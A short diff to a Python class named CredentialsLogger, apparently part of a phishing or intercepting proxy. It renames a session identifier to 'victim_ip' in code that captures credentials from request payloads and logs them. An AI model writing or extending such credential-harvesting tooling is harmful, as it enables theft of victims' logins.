@@ -86,7 +86,7 @@ class CredentialsLogger:
                 
         return captured_credentials
 
-    def process_event(self, event_type: str, request_url: str, request_method: str, request_payload: Any, proxy_session_id: str = "N/A"):
+    def process_event(self, event_type: str, request_url: str, request_method: str, request_payload: Any, victim_ip: str = "N/A"):
         """
         Analyzes the URL and payload to decide what to log.
         """
@@ -108,7 +108,7 @@ class CredentialsLogger:
         if extracted_data or (auth_action and data_submission):
             structured_log_entry = {
                 "timestamp": datetime.now(timezone.utc).isoformat(),
-                "session_id": proxy_session_id,
+                "victim_ip": victim_ip,
                 "event_type": event_type,
                 "method": request_method,
                 "target_url": request_url,
